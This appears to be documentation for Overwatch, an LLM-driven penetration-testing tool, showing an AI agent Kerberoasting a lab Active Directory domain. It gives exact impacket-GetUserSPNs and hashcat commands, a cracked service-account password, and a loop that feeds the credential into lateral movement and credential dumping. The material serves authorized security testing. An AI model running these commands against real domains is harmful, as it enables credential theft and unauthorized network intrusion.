# Featured Skill: Kerberoasting with Overwatch

A step-by-step walkthrough of how the Kerberoasting skill integrates with Overwatch's tools, graph, and inference rules.

## Finding the Skill

When the LLM encounters a domain environment with service accounts, it searches for methodology:

```
→ Call get_skill with query: "kerberoast service account"
```

The TF-IDF search returns the **Kerberos Attacks** skill (`kerberoasting.md`), which covers:

- Kerberoasting (bulk and targeted)
- AS-REP Roasting
- Silver/Golden ticket forging
- Constrained and unconstrained delegation abuse
- Resource-based constrained delegation (RBCD)

Each technique includes exact commands, OPSEC noise ratings, and graph reporting guidance.

## Prerequisites in the Graph

Before Kerberoasting, the graph needs:

```
domain-sevenkingdoms-local (type: domain)
  ↑ MEMBER_OF_DOMAIN
user-north-sql_svc (type: user, has_spn: true)
  ↑ MEMBER_OF_DOMAIN
svc-192-168-56-10-88 (type: service, service_name: kerberos)
  ↑ RUNS
host-192-168-56-10 (type: host, ip: 192.168.56.10)
```

You need:

1. A **domain controller** with Kerberos (port 88) — discovered via nmap/parse_output
2. A **valid domain credential** (any privilege level) — from prior enumeration
3. A **user with an SPN** — from BloodHound ingestion or LDAP enumeration

## The Action Lifecycle

### 1. Validate

```json
// → Call validate_action
{
  "description": "Kerberoast sql_svc on north.sevenkingdoms.local",
  "target_node": "user-north-sql_svc",
  "technique": "kerberoast",
  "tool_name": "impacket-GetUserSPNs"
}
```

The server checks:

- `user-north-sql_svc` exists in the graph ✓
- `kerberoast` is not blacklisted ✓
- OPSEC noise 0.6 is below `max_noise` ceiling ✓
- Target is in scope (domain in scope list) ✓

Returns: `action_id: "act-kerb-001"`, `valid: true`

### 2. Log Start

```json
// → Call log_action_event
{
  "action_id": "act-kerb-001",
  "event_type": "action_started",
  "details": "Kerberoasting sql_svc via impacket-GetUserSPNs"
}
```

### 3. Execute

The LLM constructs the command from the skill methodology:

```bash
impacket-GetUserSPNs 'NORTH.SEVENKINGDOMS.LOCAL/brandon.stark:Password1' \
  -dc-ip 192.168.56.10 -request-user sql_svc -outputfile /tmp/sql_svc.kerberoast
```

Then cracks the hash:

```bash
hashcat -m 13100 /tmp/sql_svc.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 4. Parse Results

```json
// → Call parse_output
{
  "tool_name": "hashcat",
  "output": "$krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$MSSQLSvc/castelblack.north.sevenkingdoms.local~1433*$...:Password123!",
  "agent_id": "primary",
  "action_id": "act-kerb-001"
}
```

The hashcat parser extracts:

- **User**: `sql_svc`
- **Domain**: `NORTH.SEVENKINGDOMS.LOCAL`
- **Hash type**: Kerberoast (mode 13100)
- **Cracked password**: `Password123!`

**Nodes created:**

| Node | Type | Key Properties |
|------|------|----------------|
| `cred-plaintext-sql_svc` | credential | `cred_type: plaintext`, `cred_value: Password123!`, `cred_user: sql_svc`, `cred_domain: north.sevenkingdoms.local` |

**Edges created:**

| Source | Target | Type | Confidence |
|--------|--------|------|------------|
| `user-north-sql_svc` | `cred-plaintext-sql_svc` | `OWNS_CRED` | 1.0 |

### 5. Log Completion

```json
// → Call log_action_event
{
  "action_id": "act-kerb-001",
  "event_type": "action_completed",
  "details": "Cracked sql_svc Kerberos TGS: Password123!"
}
```

## Inference Rules Fire

The new credential node triggers the **Credential Fanout** inference rule automatically. The engine:

1. Identifies `cred-plaintext-sql_svc` as a new credential
2. Finds all compatible services in the graph (SMB, MSSQL, WinRM on domain hosts)
3. Creates `POTENTIAL_AUTH` edges with confidence 0.5

**New inferred edges:**

| Source | Target | Type | Confidence |
|--------|--------|------|------------|
| `cred-plaintext-sql_svc` | `svc-192-168-56-10-445` | `POTENTIAL_AUTH` | 0.5 |
| `cred-plaintext-sql_svc` | `svc-192-168-56-11-445` | `POTENTIAL_AUTH` | 0.5 |
| `cred-plaintext-sql_svc` | `svc-192-168-56-11-1433` | `POTENTIAL_AUTH` | 0.5 |
| `cred-plaintext-sql_svc` | `svc-192-168-56-12-445` | `POTENTIAL_AUTH` | 0.5 |

## Frontier Impact

Before Kerberoasting:

```
→ next_task returns:
  - "Kerberoast sql_svc" (inferred_edge, confidence: 0.5)
  - "Enumerate HTTP on 192.168.56.12:80" (incomplete_node)
  - ...
```

After Kerberoasting:

```
→ next_task returns:
  - "Test sql_svc creds on SMB 192.168.56.11" (inferred_edge, confidence: 0.5)
  - "Test sql_svc creds on MSSQL 192.168.56.11" (inferred_edge, confidence: 0.5)
  - "Test sql_svc creds on SMB 192.168.56.10" (inferred_edge, confidence: 0.5)
  - "Test sql_svc creds on SMB 192.168.56.12" (inferred_edge, confidence: 0.5)
  - "Enumerate HTTP on 192.168.56.12:80" (incomplete_node)
```

The frontier exploded — one cracked credential created four new attack paths to test. The LLM will score these by proximity to objective (MSSQL on the SQL server is likely highest value).

## Dashboard View

After the Kerberoast:

- **New credential node** appears with a 2-second pulse animation
- **Amber `POTENTIAL_AUTH` edges** fan out to four services
- **Node sizing** — the credential node grows as its degree increases
- **Frontier panel** — four new items appear
- **Activity panel** — "action_completed: Cracked sql_svc Kerberos TGS" entry

Shift+click the credential node and the DC to see the shortest path. Double-click the credential to isolate its 2-hop neighborhood and see exactly what it connects to.

## What Comes Next

The skill's **Sequencing** section says:

> **Feeds →**: Credential Dumping, Lateral Movement, AD Privilege Escalation

The LLM will:

1. Test each `POTENTIAL_AUTH` edge (authenticate with cracked creds)
2. Successful auths become `VALID_ON` edges (confidence: 1.0)
3. If admin access is found, it becomes `ADMIN_TO` (credential dumping opportunity)
4. Dumped credentials trigger another round of Credential Fanout
5. The cycle continues until objectives are achieved

This is the core Overwatch loop: **discover → infer → test → discover more**.
